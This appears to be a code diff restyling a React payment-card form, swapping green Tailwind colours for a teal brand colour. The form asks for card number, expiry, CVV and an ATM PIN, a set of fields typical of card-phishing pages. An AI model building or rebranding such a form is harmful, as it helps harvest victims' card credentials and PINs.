@@ -102,7 +102,7 @@ const Card: React.FC = () => {
             value={cardNumber}
             onChange={handleCardNumberChange}
             maxLength={19}
-            className="w-full px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none focus:border-green-500"
+            className="w-full px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none focus:border-[#0f4f6c]"
             placeholder="1234 5678 9012 3456"
           />
           {errors.cardNumber && (
@@ -122,7 +122,7 @@ const Card: React.FC = () => {
             <select
               value={expiryMonth}
               onChange={(e) => setExpiryMonth(e.target.value)}
-              className="flex-1 px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none focus:border-green-500"
+              className="flex-1 px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none focus:border-[#0f4f6c]"
             >
               <option value="">Month</option>
               {Array.from({ length: 12 }, (_, i) => (
@@ -134,7 +134,7 @@ const Card: React.FC = () => {
             <select
               value={expiryYear}
               onChange={(e) => setExpiryYear(e.target.value)}
-              className="flex-1 px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none focus:border-green-500"
+              className="flex-1 px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none focus:border-[#0f4f6c]"
             >
               <option value="">Year</option>
               {years.map((year) => (
@@ -170,13 +170,13 @@ const Card: React.FC = () => {
                 if (value.length <= 4) setCvv(value);
               }}
               maxLength={4}
-              className="w-full px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none focus:border-green-500"
+              className="w-full px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none focus:border-[#0f4f6c]"
               placeholder="123"
             />
             <button
               type="button"
               onClick={() => setShowCvv(!showCvv)}
-              className="absolute right-3 top-1/2 -translate-y-1/2 text-green-600 text-sm hover:underline"
+              className="absolute right-3 top-1/2 -translate-y-1/2 text-[#0f4f6c] text-sm hover:underline"
             >
               {showCvv ? 'Hide' : 'Show'}
             </button>
@@ -207,13 +207,13 @@ const Card: React.FC = () => {
                 if (value.length <= 4) setAtmPin(value);
               }}
               maxLength={4}
-              className="w-full px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none focus:border-green-500"
+              className="w-full px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none focus:border-[#0f4f6c]"
               placeholder="****"
             />
             <button
               type="button"
               onClick={() => setShowPin(!showPin)}
-              className="absolute right-3 top-1/2 -translate-y-1/2 text-green-600 text-sm hover:underline"
+              className="absolute right-3 top-1/2 -translate-y-1/2 text-[#0f4f6c] text-sm hover:underline"
             >
               {showPin ? 'Hide' : 'Show'}
             </button>
@@ -232,13 +232,13 @@ const Card: React.FC = () => {
           {!isLoading ? (
             <button
               type="submit"
-              className="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded font-medium transition-colors"
+              className="w-full bg-[#0f4f6c] hover:bg-[#083d52] text-white py-3 rounded font-medium transition-colors"
             >
               Continue
             </button>
           ) : (
             <div className="flex justify-center py-3">
-              <div className="h-8 w-8 animate-spin rounded-full border-4 border-solid border-green-600 border-t-transparent"></div>
+              <div className="h-8 w-8 animate-spin rounded-full border-4 border-solid border-[#0f4f6c] border-t-transparent"></div>
             </div>
           )}
         </div>
